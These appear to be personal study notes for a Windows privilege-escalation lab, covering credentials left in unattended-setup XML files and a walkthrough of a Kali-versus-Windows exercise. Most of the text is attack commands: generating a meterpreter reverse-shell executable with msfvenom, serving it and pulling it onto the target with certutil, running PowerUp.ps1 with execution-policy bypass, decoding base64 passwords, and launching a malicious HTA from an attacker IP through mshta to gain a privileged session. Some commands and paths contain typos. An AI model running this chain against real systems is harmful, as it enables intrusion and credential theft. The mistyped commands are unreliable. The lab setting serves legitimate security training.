#### Configuration Files
		- Unattended Windows Setup Utility is used to automate mass installation or deployment of windows
		- Tool utilizes specific configurations and user account credentials
		- Credentials kept by Unattended Windows Setup Utility can be found by a malicious user.

#### Unattended Windows Setup
	- Will utilize these coniguration files: 
		- C:\Windows\Panther\Unattended.xml
		- C:\Windows\Panther\Autounattneded
	-  Might be encoded by base64


#### Tools 
msfvenom


#### Commands

Generate Windows reverse shell
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Local_IP LPORT=Local_Port -f exe > payload_name.exe
```

Create python server
	- On target system access local ip on port 80 
```
python -m SimpleHTTPServer 80
```

Download payload from local server
```
certutil -urlchache -f http://local_ip/payload_name.exe payload_name.exe
```

Set Payload in msfconsole to the one that was created
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT
set LHOST
```

Search for unattended files or navigate manually
```
search -f Unattend.xml
```

Print out unattended file
```
cat unattended.xml
```


```
base64 -d password.txt
```

## Lab Unattended Installation

10.4.18.170

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)post-exploitation framework has provided to you on the windows machine.

Objective: Gain access to meterpreter session with high privilege.

Instructions:

- You can check the IP address of the machine by running "ipconfig" command on the command prompt i.e cmd.exe
- Do not attack the gateway located at IP address 10.0.0.1


Look for misconfigurations on the windows systems using PowerUp.ps1
In a powershell terminal navigate to the PowerUp.ps1 file and execute it
Check output for unattended path
```
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

Search unattended.xml file for password
In this case the password has been encoded via base64
```
$password='<password>'
 $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

Open command prompt as admin with runas
```
runas.exe /user:administrator cmd
```

Switch over the Metasploitable Machine
```
msfconsole -q 
use exploit/windows/misc/hta_server
exploit
```

In the privileged command prompt execute the mshta executable along with the malicious link
```
mshta http://10.10.22.3:8080/9cIRizM1J.hta
```